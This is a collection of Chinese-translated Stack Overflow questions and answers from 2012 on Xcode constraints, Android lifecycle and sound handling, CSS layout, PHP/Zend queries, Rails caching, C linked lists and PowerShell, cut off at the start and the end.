这在 C++11 中是不允许的，但现在在 C++14 中是允许的。

请参阅[https://en.wikipedia.org/wiki/C%2B%2B14#Relaxed_constexpr_restrictions](https://en.wikipedia.org/wiki/C%2B%2B14#Relaxed_constexpr_restrictions)

# xcode4 - Xcode 4.4 约束错误

> ID：11917583
> 
> 赞同：3
> 
> 时间：2012-08-11T20:54:36.300
> 
> 标签：xcode4, constraints

我正在使用 Xcode 4.4 并在界面生成器中创建我的视图。当我运行我的应用程序时，我一直收到以下约束错误。

```
Unable to simultaneously satisfy constraints:
(
    "<NSAutoresizingMaskLayoutConstraint:0x104486db0 h=-&- v=-&- V:[NSView:0x106a33090]-(0)-|   (Names: '|':NSClipView:0x106a0cef0 )>",
    "<NSAutoresizingMaskLayoutConstraint:0x104486e10 h=-&- v=-&- V:|-(15)-[NSView:0x106a33090]   (Names: '|':NSClipView:0x106a0cef0 )>",
    "<NSAutoresizingMaskLayoutConstraint:0x1002da350 h=--& v=--& V:[NSClipView:0x106a0cef0(672)]>",
    "<NSLayoutConstraint:0x106a11ba0 V:[NSView:0x1044eb990]-(657)-|   (Names: '|':NSView:0x106a33090 )>",
    "<NSLayoutConstraint:0x1044d68d0 V:|-(270)-[NSView:0x1044eb990]   (Names: '|':NSView:0x106a33090 )>",
    "<NSLayoutConstraint:0x100271040 V:[NSView:0x1044eb990(245)]>"
)

Will attempt to recover by breaking constraint 
<NSLayoutConstraint:0x100271040 V:[NSView:0x1044eb990(245)]>

Set the NSUserDefault NSConstraintBasedLayoutVisualizeMutuallyExclusiveConstraints 
to YES to have -[NSWindow visualizeConstraints:] automatically called when this happens.
And/or, break on objc_exception_throw to catch this in the debugger. 
```

关于如何解决这个问题的任何建议？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-23T01:25:05.587

对于您打算约束的每个视图，请执行以下操作：

```
[view setTranslatesAutoresizingMaskIntoConstraints:NO]; 
```

这将摆脱日志中的“NSAutoresizingMaskLayoutConstraint”部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-09T10:42:45.650

还有一种方法可以在不编写代码的情况下解决这个问题。

在情节提要中，选择您的超级视图。在 Attributes Inspector 中，取消选中“Autoresize Subviews”复选框，如下所示。

![Xcode 5 截图](../Images/431b8d8f6128d844edd3f56f02bc9994.png)

这将添加`autoresizesSubviews="NO"`到情节提要 XML 文件中。在我的例子中，XML 已经包含了`translatesAutoresizingMaskIntoConstraints="NO"`，但是，这并没有阻止自动布局创建`NSAutoresizingMaskLayoutConstraint`s。

*注意：也许我的回答仅适用于**Xcode 5**，因为我无法检查 Xcode 4.4 是否已经有此复选框。但由于谷歌在搜索时仍然会出现这个 SO 问题`NSAutoresizingMaskLayoutConstraint`，它可能会使某人受益。*

# android - 在方向更改时停留在最后一个选项卡上，但不在应用程序启动时

> ID：11917584
> 
> 赞同：1
> 
> 时间：2012-08-11T20:54:46.827
> 
> 标签：android, tabs, android-orientation, savestate

在我的应用程序的主要活动中，我有三个选项卡，单击它们时，会将活动的 contentView 切换到不同的布局。我的问题是，当方向改变时，会自动选择第一个选项卡并加载第一个布局。

我对如何解决此问题的第一个想法是将选项卡位置保存在 savedInstanceState 或 sharedPrefs 文件中，但其中一个解决方案的问题是它们也会在首次打开应用程序并调用 OnCreate() 时发生.

明确地说，我希望发生以下情况：

*   在应用程序加载时（新活动，调用 onCreate()）- 始终加载第一个选项卡
*   在应用恢复时（应用暂停后，调用 Onresume()）- 加载最后打开的选项卡
*   方向更改时（更改后，调用 OnCreate() 吗？）- 加载最后打开的选项卡

基本上，我试图找到一种方法来区分方向变化（女巫调用 OnDestroy() 和 onCreate()）以及应用程序首次启动时的 onCreate() 和 onDestory()。

如果可能的话，我宁愿不在清单中的 configChanges="orientation" 行，而是自己处理开关，因为我听说在处理不同的屏幕尺寸和密度等时会导致问题。

有什么办法可以做到这一点，还是我必须适应不同的行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T00:03:20.447

`onSaveInstanceState`是正确的方法。活动完成后它*不会*持续存在，只有当它“进入后台状态”或进行方向更改时。

# html - Div 的移动和调整大小协调一致

> ID：11917588
> 
> 赞同：0
> 
> 时间：2012-08-11T20:55:17.167
> 
> 标签：html, css

我正在努力做到这一点，所以当一个 div 的高度变小时，另一个会随之向上移动。

这是一个[小提琴。](http://jsfiddle.net/MichaelT/rN6dT/)

因此，如果我要使`#top`（具有绝对定位）的高度为 400px 而不是 600px，如何确保其下方相对定位的 div 从其原始位置 620px 从顶部移动到 420px？

基本上，它是响应浏览器的。如果浏览器做得更小，`#top`会缩放，所以下面的 div 需要随之移动。

更新

HTML：

```
<!DOCTYPE HTML>
<html lang="en-UK">
    <head>
        <link href="Stylesheet.css" rel ="stylesheet" type="text/css">

        <title>Hello World</title>
    </head>
    <body>
        <div id="top"></div>
        <div id ="logo"></div>
<div class="container">A wiki (i/ˈwɪkiː/ wik-ee) is a website which allows its users to add, modify, or delete its content via a web browser usually using a simplified markup language or a rich-text editor.[1][2][3] Wikis are powered by wiki software. Most are created collaboratively.
Wikis may serve many different purposes, such as knowledge management and notetaking. Wikis can be community websites and intranets, for example. Some permit control over different functions (levels of access). For example, editing rights may permit changing, adding or removing material. Others may permit access without enforcing access control. Other rules may also be imposed for organizing content.
Ward Cunningham, the developer of the first wiki software, WikiWikiWeb, originally described it as "the simplest online database that could possibly work."[4] "Wiki" (pronounced [ˈwiti] or [ˈviti]) is a Hawaiian word meaning "fast" or "quick".[5]A wiki (i/ˈwɪkiː/ wik-ee) is a website which allows its users to add, modify, or delete its content via a web browser usually using a simplified markup language or a rich-text editor.[1][2][3] Wikis are powered by wiki software. Most are created collaboratively.
Wikis may serve many different purposes, such as knowledge management and notetaking. Wikis can be community websites and intranets, for example. Some permit control over different functions (levels of access). For example, editing rights may permit changing, adding or removing material. Others may permit access without enforcing access control. Other rules may also be imposed for organizing content.
Ward Cunningham, the developer of the first wiki software, WikiWikiWeb, originally described it as "the simplest online database that could possibly work</div>
    </body>
</html> 
```

CSS：

```
body{
    background-color: red;
    width: 100%;
}

div#top{
    position: relative;
    display: block;
    width:100%;
    height: 600px;
    top:0;
    left:0;
    background-color: black;
    border-bottom: 3px solid white;
    margin-bottom: 20px;

}

div#logo{
    position:absolute;
    color: green;
    left: 50%;
    margin-top: 20px;
    margin-bottom: 30px;
}

.container{
    position: relative;
    margin: 0 auto;
    margin-top: 20px;
    width: 920px;

    }​ 
```

填充问题

![在此处输入图像描述](../Images/895a1140408097dc6c056c369034ea79.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:08:43.303

假设您需要保留`#top`as `position: absolute`，则没有纯 CSS 方法可以做到这一点。由于`#top`是绝对的，它不再是文档流的一部分，`#container`也不再与之相关。你可以

A. 使用 javascript 观看`window.resize`事件或您所指的任何调整大小的事件，然后执行数学以更改`top`属性`#container`

或者

B. 更改`#top`并`position: relative`删除`top`CSS 属性`#container`

或者

`#top`C. 对' 高度和`#container`'`top`属性使用基于百分比的值。

# php - 如何从数组中获取值？php

> ID：11917590
> 
> 赞同：0
> 
> 时间：2012-08-11T20:55:18.550
> 
> 标签：php, zend-framework, sendmail

```
class Application_Model_DbTable_Email extends Zend_Db_Table_Abstract
{

protected $_name = 'memberdetail';  

public function sendEmail($email)
{

    $email = $_POST['email'];
    $userid = ($this->select('userid')
            ->from('usertable', 'memberdetail')
            ->where('usertable.userid = memberdetail.memberid AND memberdetail.memberid = (SELECT memberid FROM memberdetail WHERE email = ?)', "".$email. "'"));

    $reset = new Application_Model_DbTable_Register();
    $reset->resetPass($userid);

    $pswd = new Application_Model_DbTable_Register();
    $pswd = $pswd->getTemp();

    $mail = new Zend_Mail();

    $mail->setFrom('swap.test@yahoo.com.sg', 'Inexorable Beauty');
    $mail->addTo($email, $email);
    $mail->setSubject('Inexorable Beauty: Password Reset');
    $mail->setBodyText('Dear Customer,

            You have requested to reset your password.
            This is the temporary password: '.$pswd.'

            Please log in immediately and change your password.
            Thank You.

            Yours Sincerely,
            Inexorable Beauty');

    $mail->send();

    if($mail->send())
    {
        echo "Email successfully sent!";
    }
    else
    {
        echo "Email was not sent";
    }

} 
```

我正在尝试获取从 memberid 引用的用户 ID。我可以通过 $_POST['email'] 的电子邮件获取 memberid。问题是，我似乎无法获得用户 ID 的值。我试图通过一个while循环来回显用户ID，但它不起作用。当我打印 SQL 时，它似乎与我写的语句不同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:39:49.303

尝试像这样运行查询：

```
$email = $_POST['email'];
$subquery = $db->select()
               ->from('memberdetail', array('memberid'))
               ->where('email = ?', $email);

$select = $db->select()
             ->from('usertable', array('userid'))
             ->join('memberdetail', 'usertable.userid = memberdetail.memberid')
             ->where('usertable.userid = ?', $subquery);

$result = $select->query()->fetch();
if (!$result) {
    // user not found
} else {
    $userid = $result['userid'];
} 
```

您现在拥有的方式`$userid`只是一个`Zend_Db_Select`对象，但从未执行过任何查询。此外，您不会将任何参数传递给`select()`，在方法中指定您想要的列`from()`。

# asp.net-mvc - 为琐碎的事情创建一个类？

> ID：11917593
> 
> 赞同：0
> 
> 时间：2012-08-11T20:55:41.660
> 
> 标签：asp.net-mvc, design-patterns

一个枚举从服务层返回，带有 4 个选项中的 1 个选项，并且正在使用 case 语句在我的 Web 代码中处理它。我想我会在几个地方做这件事，并有一些设计模式。现在基于 Enum 中的每个值，我正在返回一个 string 。为每个枚举创建一个类似乎是一种矫枉过正。处理这个问题的最佳方法是什么

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T22:50:09.070

您不需要为每个枚举值创建一个新的子类，您可以拥有同一个类的多个实例，每个值一个：

```
public class MyEnumType {
  private readonly string value;

  private MyEnumType(string value) {
    this.value = value;
  }

  public string Value {
    get { return value; }
  }

  public static readonly MyEnumType ValueA = new MyEnumType("foo");
  public static readonly MyEnumType ValueB = new MyEnumType("bar");
  ...
} 
```

# android - SoundManager 中偶尔出现 NullPointerException

> ID：11917595
> 
> 赞同：6
> 
> 时间：2012-08-11T20:55:46.327
> 
> 标签：android

我使用这个标准的 SoundManager。它在我的所有设备上都可以正常工作，但仅在市场上偶尔出现这些错误

1.  SoundManager.playSound(SoundManager.java:87) 中的 NullPointerException

2.  SoundManager.cleanup(SoundManager.java:107) 中的 NullPointerException

这是代码：

```
public class SoundManager {

    private static SoundManager _instance;
    private static SoundPool mSoundPool; 
    private static HashMap<Integer, Integer> mSoundPoolMap; 
    private static AudioManager  mAudioManager;
    private static Context mContext;

    private SoundManager(){   }

    static synchronized public SoundManager getInstance(){
        if (_instance == null) 
          _instance = new SoundManager();
        return _instance;
     }

    public static  void initSounds(Context theContext){ 
         mContext = theContext;
         mSoundPool = new SoundPool(4, AudioManager.STREAM_MUSIC, 0);
         mSoundPoolMap = new HashMap<Integer, Integer>(); 
         mAudioManager = (AudioManager)mContext.getSystemService(Context.AUDIO_SERVICE);        
    } 

    public static void addSound(int Index,int SoundID){
        mSoundPoolMap.put(Index, mSoundPool.load(mContext, SoundID, 1));
    }

    public static void loadSounds(){

        mSoundPoolMap.put(1, mSoundPool.load(mContext, R.raw.kick1, 1)); 
        mSoundPoolMap.put(2, mSoundPool.load(mContext, R.raw.kick2, 1)); 
        mSoundPoolMap.put(3, mSoundPool.load(mContext, R.raw.kick3, 1));    

    }

    public static void playSound(int index, float volume){      
             **line 87:** float streamVolume = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC); 
             streamVolume = streamVolume / mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
             mSoundPool.play(mSoundPoolMap.get(index), streamVolume*volume, streamVolume*volume, 1, 0, 1); 
    }

    public static void stopSound(int index){
        mSoundPool.stop(mSoundPoolMap.get(index));
    }

    public static void cleanup(){
        **line 107:** mSoundPool.release();
        mSoundPool = null;
        mSoundPoolMap.clear();
        mAudioManager.unloadSoundEffects();
        _instance = null;

    }
} 
```

这是启动活动中的清理调用：

```
 //REMOVE SOUND MEMORY ALLOCATION
    @Override
    public void onDestroy()
        {
            super.onDestroy();
            SoundManager.cleanup();
        } 
```

有谁知道是什么导致了这些偶尔出现的罕见错误以及如何防止它们？这发生在我所有使用此 SoundManager 的应用程序中......即使有点奇怪的猜测也会有所帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-15T10:15:33.183

有一点混乱。您不（也不应该）将单例模式与静态方法和变量（getInstance() 和 mInstance 变量除外）一起使用。这没有意义。

您应该摆脱静态并将该类完全用作单例，以确保由于并发问题没有变量可能为空（我猜您的空问题是并发的结果）

这是我将使用的类：

```
public class SoundManager {
    // syncronized creation of mInstance
    private final static SoundManager mInstance = new SoundManager(); 
    private SoundPool mSoundPool; 
    private HashMap<Integer, Integer> mSoundPoolMap; 
    private AudioManager  mAudioManager;
    private Context mContext;

    private SoundManager() {}

    public static SoundManager getInstance() {
        return _instance;
    }

    public void initSounds(Context theContext) { 
        mContext = theContext;
        mSoundPool = new SoundPool(4, AudioManager.STREAM_MUSIC, 0);
        mSoundPoolMap = new HashMap<Integer, Integer>(); 
        mAudioManager = (AudioManager) mContext.getSystemService(Context.AUDIO_SERVICE);        
    } 

    public void addSound(int Index,int SoundID){
        mSoundPoolMap.put(Index, mSoundPool.load(mContext, SoundID, 1));
    }

    public void loadSounds() {
        mSoundPoolMap.put(1, mSoundPool.load(mContext, R.raw.kick1, 1)); 
        mSoundPoolMap.put(2, mSoundPool.load(mContext, R.raw.kick2, 1)); 
        mSoundPoolMap.put(3, mSoundPool.load(mContext, R.raw.kick3, 1));
    }

    public void playSound(int index, float volume){      
        float streamVolume = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC); 
        streamVolume = streamVolume / mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        mSoundPool.play(mSoundPoolMap.get(index), streamVolume*volume, streamVolume*volume, 1, 0, 1); 
    }

    public void stopSound(int index) {
        mSoundPool.stop(mSoundPoolMap.get(index));
    }

    // I wouldn't use this until I am extremely sure that I
    // will never ever use the SoundManager again... so
    // probably never. Let the SoundManager die when the application dies...
    public void cleanup() {
        mSoundPool.release();
        mSoundPool = null;
        mSoundPoolMap.clear();
        mAudioManager.unloadSoundEffects();
    }
} 
```

现在的使用时间有点长，但应该删除随机 NPE。您应该在`onCreate()`.

```
SoundManager.getInstance().initSounds(context); 
```

然后在需要使用该类的任何地方：

```
SoundManager.getInstance().playSound(index, volume);
// or what ever you need 
```

更新：

要回答您的评论：

如果您在 Application::onCreate() 中创建实例，您将*始终*拥有该实例，并且该实例也是内部变量。当用户离开应用程序时可能会发生两种情况：

1.  它可以被销毁，但是一旦用户再次进入应用程序，就会再次调用 onCreate
2.  什么都没有发生，实例仍然存在。

因此，在这两种情况下，您都不会丢失实例。

仅仅因为其他人可能会以特定的方式这样做并不能使这种方式成为正确的方式。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-15T23:42:57.630

当您初始化 SoundManager 时，请使用应用程序上下文。您可能在活动之间遇到问题。如果 SoundManager 的寿命比您的活动长。您甚至可以在您的应用程序中进行初始化。

```
public class MyAndroidApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        SoundManager.initSounds(this);
    }
} 
```

我也同意 WarrenFaith 的观点。唯一的静态应该是 _instance 和 getInstance()。

此外，如果您在 Application 类中加载声音，则无需担心同步问题。

如果有帮助，您可以查看我使用的代码。它利用来自[http://code.google.com/p/opensl-soundpool/的 OpenSL SoundPool 库](http://code.google.com/p/opensl-soundpool/)

```
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaPlayer;

import com.kytomaki.openslsoundpool.JavaSoundPool;
import com.kytomaki.openslsoundpool.OpenSLSoundPool;
import com.kytomaki.openslsoundpool.SoundPoolIf;

final public class SoundManager
{
    // Predetermined sound ID's
    public static final int             NO_SOUND        = -1 ;
    public static final int             WINNER          = -2 ;

    // Tag for logging
    protected static final String       TAG             = "SoundManager" ;

    /** Used to load and play sounds **/
    private Context                     context ;

    /** Sound can be disable from separate thread **/
    private final AtomicBoolean         useSound ;

    // Sound Arrays
    private final ArrayList<Integer>    winningSounds ;
    private final SoundPoolIf           soundPool ;
    private final HashMap<Integer, Integer> soundPoolMap ;
    private final AudioManager          audioManager ;

    /** Singleton object for sound play back **/
    private static SoundManager         soundManagerInstance ;

    private static final int            USE_SOUNDPOOL   = 1 ;
    private static final int            USE_OPENSL      = 2 ;
    private static int                  use             = USE_SOUNDPOOL ;

    /**
     * Private Method to create a new SoundManager<br>
     * This is a Singleton Object
     * @param context Should be the Application Context
     */
    private SoundManager( final Context context )
    {
        setContext( context ) ;
        useSound = new AtomicBoolean( true ) ;
        audioManager = (AudioManager) context.getSystemService( Context.AUDIO_SERVICE ) ;

        soundPoolMap = new HashMap<Integer, Integer>() ;
        winningSounds = new ArrayList<Integer>() ;

        if ( use == USE_OPENSL )
        {
            soundPool = new OpenSLSoundPool( 2, OpenSLSoundPool.RATE_44_1, OpenSLSoundPool.FORMAT_16, 1) ;
        } else {
            soundPool = new JavaSoundPool( 2 ) ;
        }
    }

    /**
     * Must be called before using<br>
     * Best to initialize in Application Class
     * @param context
     */
    public static void initSoundManager( final Context context )
    {
        if ( soundManagerInstance == null )
        {
            soundManagerInstance = new SoundManager( context ) ;
        }
        else
        {
            throw new UnsupportedOperationException( "Sound manager has already been created" ) ;
        }
    }

    /**
     * Overloaded method to allow use of OpenSL
     * @param context
     * @param useOpenSL
     */
    public static void initSoundManager( final Context context, final boolean useOpenSL){
        if(useOpenSL){
            use = USE_OPENSL;
        }
        initSoundManager(context);
    }

    /**
     * Must initialize first with {@link SoundManager#initSoundManager(Context)}
     * @return instance of SoundManager
     */
    public static SoundManager getSoundManagerInstance()
    {
        if ( soundManagerInstance != null )
        {
            return soundManagerInstance ;
        }
        else
        {
            throw new UnsupportedOperationException( "SoundManager must be initalized" ) ;
        }
    }

    /**
     * Add a sound from an android resource file R.id.sound<br>
     * To be played back with SoundManager.play(soundId)
     * @param soundId
     * @param soundResourceId
     */
    public void addSound( final int soundId, final int soundResourceId )
    {
        soundPoolMap.put(soundId, soundPool.load(getContext(), soundResourceId));
    }

    /**
     * Adds a winning sound from a resource to be played at random<br>
     * Called by SoundManager.play(WINNER)
     * @param soundResourceId
     */
    public void addWinningSound( final int soundResourceId )
    {
        winningSounds.add( soundResourceId ) ;
    }

    /**
     * Plays a sound first checking if sound is enabled
     * @param soundToPlay soundId or WINNER to play random winning sound
     */
    public synchronized void play( final int soundToPlay )
    {
        if ( isUseSound() )
        {
            switch ( soundToPlay )
            {
                case NO_SOUND :
                    break ;
                case WINNER :
                    // Play a random winning sound using media player
                    final MediaPlayer mp ;
                    mp = MediaPlayer.create( getContext(), randomWinnerSound() ) ; 
                    if ( mp != null )
                    {
                        mp.seekTo( 0 ) ;
                        mp.start() ;
                    }
                    break ;
                default :
                    playSound( soundToPlay ) ;
                    break ;
            }
        }
    }

    /**
     * Calls soundpool.play
     * @param soundToPlay
     */
    private void playSound( final int soundToPlay )
    {
        float streamVolume = audioManager.getStreamVolume( AudioManager.STREAM_MUSIC ) ;
        streamVolume = streamVolume / audioManager.getStreamMaxVolume( AudioManager.STREAM_MUSIC ) ;
        soundPool.play(soundPoolMap.get(soundToPlay), streamVolume);
    }

    /**
     * @return random winning sound position
     */
    private int randomWinnerSound()
    {
        final Random rand = new Random() ;
        final int playNumber = rand.nextInt( winningSounds.size() ) ;
        return winningSounds.get( playNumber ) ;
    }

    /**
     * @param context the context to set
     */
    private final void setContext( final Context context )
    {
        this.context = context ;
    }

    /**
     * @return the context
     */
    private final Context getContext()
    {
        return context ;
    }

    /**
     * @param useSound false to disable sound
     */
    public final void setUseSound( final boolean useSound )
    {
        this.useSound.set( useSound ) ;
    }

    /**
     * @return the useSound
     */
    public boolean isUseSound()
    {
        return useSound.get() ;
    }

} 
```

仍在进行中的工作，但完成了工作。

# php - 我应该使用 . 或者，在 PHP 短标签回显中分隔变量？

> ID：11917596
> 
> 赞同：2
> 
> 时间：2012-08-11T20:55:59.713
> 
> 标签：php, echo, php-shorttags

例如：

```
<?php

$var1 = '牛';
$var2 = '羔羊';

?>

<?=$var1,$var2?>
```

或者最后一部分应该是：

```
<?=$var1.$var2?>
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:59:29.583

您正在执行的操作是串联。从技术上讲，您也可以使用逗号，但为了清楚起见，我会使用连接运算符，它是一个句点（或点）。

使用逗号似乎稍微快一些，但这种速度差异可以忽略不计。代码应该始终针对阅读进行优化（根据定义已经很难阅读），只有在遇到严重的性能问题时才能开始优化。即便如此，用传递多个参数来代替串联也不会有太大改善。

此外，这仅适用于 echo() 函数。一致性通常是好事。

PS 为了便于阅读，通常还建议在逗号后或运算符周围使用空格：

```
<?=$var1 . $var2?>
<?=$var1, $var2?> 
```

# ruby-on-rails-3 - 尝试使用 memcached 缓存 Rails 多页视图

> ID：11917602
> 
> 赞同：0
> 
> 时间：2012-08-11T20:56:26.690
> 
> 标签：ruby-on-rails-3, caching, memcached

我试图理解为什么我的 Rails 动作缓存没有基于正确的 URL 请求和参数进行缓存。

例如，当我请求时`page/2`，缓存系统返回`page`.

这是奇怪响应的日志示例：

```
Started GET "/clips/page/2" for 127.0.0.1 at 2012-08-11 16:46:42 -0400
Processing by ClipsController#index as HTML
  Parameters: {"page"=>"2"}
  User Load (0.2ms)  SELECT "users".* FROM "users" WHERE "users"."id" = 1 LIMIT 1
Cache read: views/localhost:3000/clips/page
Read fragment views/localhost:3000/clips/page (0.3ms)
  Rendered text template within layouts/application (0.0ms)
Completed 200 OK in 50ms (ActiveRecord: 0.2ms) 
```

我认为奇怪的是，被要求的 URL 显然是`/clips/page/2`，而响应是 "fragment" `Read fragment views/localhost:3000/clips/page (0.3ms)`。

在我的控制器中，我有：

`caches_action :index, :layout => false`

和一个非常简单的索引操作：

```
def index
    @clips = current_user.clips.page(params[:page]).order('created_at DESC')

    respond_to do |format|
        format.html # index.html.erb
        format.json { render json: @clips }
    end
end 
```

我的 development.rb 配置文件，我正在测试它已启用缓存，如下所示：

```
 # caching
  config.perform_caching = true # cache test
  config.action_controller.perform_caching = true # cache test
  # config.action_controller.perform_caching = false # default

  config.cache_store = :dalli_store, 'localhost:11211' 
```

我正在阅读本关于缓存的教程：http: [//broadcastingadam.com/2012/07/advanced_caching_part_1-caching_strategies/](http://broadcastingadam.com/2012/07/advanced_caching_part_1-caching_strategies/)

那里的示例与我的情况几乎相同，给出了正确的响应：

```
Started GET "/posts/2" for 127.0.0.1 at 2011-05-01 16:54:43 -0700
  Processing by PostsController#show as HTML
  Parameters: {"id"=>"2"}
Read fragment views/localhost:3000/posts/2 (0.5ms)
Rendered posts/show.html.erb within layouts/application (6.1ms)
Write fragment views/localhost:3000/posts/2 (0.5ms)
Completed 200 OK in 16ms (Views: 8.6ms | ActiveRecord: 0.1ms) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:02:02.413

好的，我刚刚测试了对路线的更改，并意识到问题是由于路线要求**可选**页面 id 的方式造成的！

所以这不起作用：

`get "/clips/page(/:page)", :controller => "clips", :action => "index"`

虽然这会起作用：

`get "/clips/page/:page", :controller => "clips", :action => "index"`

# android - 如何删除活动动画上的黑色顶栏

> ID：11917603
> 
> 赞同：1
> 
> 时间：2012-08-11T20:56:45.540
> 
> 标签：android, animation

我为进入活动定义了从 0 到 1 的缩放动画：

```
overridePendingTransition(R.anim.scale, 0); 
```

在清单的应用程序标签中：

```
android:theme="@android:style/Theme.NoTitleBar" 
```

但是我在进入活动时得到一个黑色的顶栏，虽然它可以缩放......看起来很丑，因为活动没有显示这个顶栏。我该如何隐藏它？

编辑：动画 xml 是这样的：

```
<set xmlns:android="http://schemas.android.com/apk/res/android">

<scale 
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:duration="1000"
    android:fromXScale="0"
    android:fromYScale="0"
    android:pivotX="50%"
    android:pivotY="50%"
    android:toXScale="1"
    android:toYScale="1" 
    android:fillAfter="true"
/>
</set> 
```

（设置元素其实不是必须的，有它是因为我之前用其他动画测试过）。

黑色的 topbar 隐藏在系统的 topbar 后面，而 Activity 变成了它的最终大小。

PS明天我会尝试另一个想法...隐藏状态栏在已启动活动的onCreate中...因为这个黑色空间正是状态栏占用的空间。如果您有任何其他建议，请发表！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T17:39:30.557

我找到了这个问题的解决方案，在代码 setContextView(...) 之前粘贴下一个代码

```
ColorDrawable colorDrawable = new ColorDrawable( Color.TRANSPARENT );
getWindow().setBackgroundDrawable( colorDrawable ); 
```

这对我来说可以！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:03:02.657

我假设您指的是来自 Android 4.0 的操作栏。如果是这样，对于 Android 4.0+，请指定：

```
android:theme="@android:style/heme.Holo.NoActionBar.Fullscreen" 
```

您可以为 4.0+ 单独指定此项，对于没有 Holo 主题的 2.x。

# c - C中的链表空值

> ID：11917608
> 
> 赞同：0
> 
> 时间：2012-08-11T20:58:16.430
> 
> 标签：c, linked-list

我不知道为什么返回的列表是`NULL`，这是代码：

在我的 List.h

```
struct nodo_ {
    char* dato;

    struct nodo_ *next;
};
struct nodo_ *Lista;
/*Def list */
void createList(struct nodo_ **Lista); 
```

在我的 main.c

```
struct nodo_ *Lista;

int main(){
    createList(Lista);
    while(Lista != NULL){        
         printf("The date is %s\n  ",Lista->dato); //Error here now
         Lisa = Lista->next;
    }

    return 0 ;
} 
```

在我的 List.c 中创建列表：

```
void createList(struct nodo_ *Lista){
    struct nodo_ *Aux_List = list_D;
    aux_List = malloc(sizeof(struct nodo_));

    char* path_a = "Hello"; 
    char* path_B = "Minasan";

    /* Store */
    aux_List->dato = path_a;
    aux_List = Aux_List->next;    
    aux_List = malloc(sizeof(struct nodo_));
    aux_List->dato = path_b;
    aux_List->next = NULL;

} 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:01:27.930

该指针是按值传递的，即制作了一个副本。如果您希望将指针初始化为一个全新的值，那么您必须使用另一个间接级别（即 a `nodo_**`）。

附带说明一下，`typedef`ing 指针类型几乎总是一个坏主意，除非该类型确实不透明（您的类型不是）。当您考虑代码中的另一个错误时，此“规则”的一个原因很明显：

```
auxList = (Lista*)malloc(sizeof(Lista)); 
```

您正在为指向 的指针分配空间，而对于对象`noda_`来说还不够。`noda_`此外，不要`malloc`在 C 中强制转换的返回值。这是多余的，因为 a`void*`被安全且隐式地转换为任何其他指针类型，如果您忘记包含`stdlib.h`， `malloc`将被假定为返回的函数`int`，并且强制转换隐藏错误。（仅适用于实现 C89 或更早版本的编译器）

编辑：

在函数中初始化指针参数：

```
void init(struct node **n) {
    if(n)
        *n = malloc(sizeof(struct node));
}

int main() {
    struct node *n;
    init(&n);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:42:08.197

在我深入研究代码之前，对您的实际问题的简短回答：

> ...为什么返回的列表为 NULL ...

没有返回列表，您既不使用*传递*`return`结果，也不设置 out 参数的值。

在您编辑的代码中：

```
void createList(struct nodo_ **Lista){
    struct nodo_ *Aux_List = list_D;
    aux_List = malloc(sizeof(struct nodo_)); 
```

您首先设置`Aux_List`为 的*当前值*，`Lista`您知道它尚未初始化，因为您正在尝试对其进行初始化。然后你*丢弃*`aux_List`那个值，用 . 返回的新地址覆盖`malloc`。您永远不会将任何内容存储到`*Lista`中，这将是此函数按声明工作的唯一方法。

* * *

正如 Ed 建议的那样，你的 typedef 隐藏了很多有用的信息，所以让我们扩展它

```
struct nodo {
    char* dato;

    struct nodo *next;
};

/*Def list */
void createList(struct nodo* list_D); 
```

现在，您可以看到这`createList`是错误的：您可以传入列表的头节点（无论如何这都没用），但它无法将新分配的列表返回给调用者。

坦率地说`createList`，无论如何，你的原语都不是有用的，所以我要先从一个合理的基础开始：

```
struct nodo *alloc_nodo(char *dato, struct nodo *next)
{
    struct nodo *n = malloc(sizeof(*n));
    n->dato = dato;
    n->next = next;
    return n;
} 
```

现在，在我们重新编写你的`createList`使用之前，让我们看看它现在做了什么：

```
void createList(struct nodo *list_D)
{
    struct nodo *aux_List = list_D;
    aux_List = malloc(sizeof(struct nodo_));
    /* ^ so, we take the input argument and immediately discard it */

    char* path_a = "Hello"; 
    char* path_B = "Minasan";

    /* Store */
    aux_List->dato = path_a;
    aux_List = Aux_List->next;
    /* ^ note that we haven't initialized aux_List->next yet,
       so this is a random pointer value */

    aux_List = malloc(sizeof(struct nodo_));
    /* again, we set aux_List to something,
       but immediately overwrite and discard it */

    aux_List->dato = path_b;
    aux_List->next = NULL;
} 
```

因此，它忽略了它的输入，不返回输出，并泄漏了两个未相互连接的部分初始化的节点。我相信您想要实现更多类似的目标：

```
struct nodo* create_my_list()
{
    struct nodo *tail = alloc_nodo("Minasan", NULL);
    /* the end (tail) of the linked list has a NULL next pointer */

    struct nodo *head = alloc_nodo("Hello", tail);
    /* the head of the linked list points to the next node */

    return head;
    /* like a snake, you hold a singly-linked list by the head */
} 
```

如果我们现在写`main`来使用这个函数，它看起来像：

```
int main()
{
    struct nodo *head = create_my_list();
    struct nodo *n;
    for (n = head; n != NULL; n = n->next)
    {
         printf("The date is %s\n  ", n->dato);
    }
} 
```

# powershell - Powershell：将变量传递到函数内的脚本块

> ID：11917610
> 
> 赞同：1
> 
> 时间：2012-08-11T20:58:57.727
> 
> 标签：powershell

所以拿这个代码：

```
function populate([string] $group)
{
    $listbox.items.clear()
    Get-ADGroup -filter {cn -like "*$group*"} | 
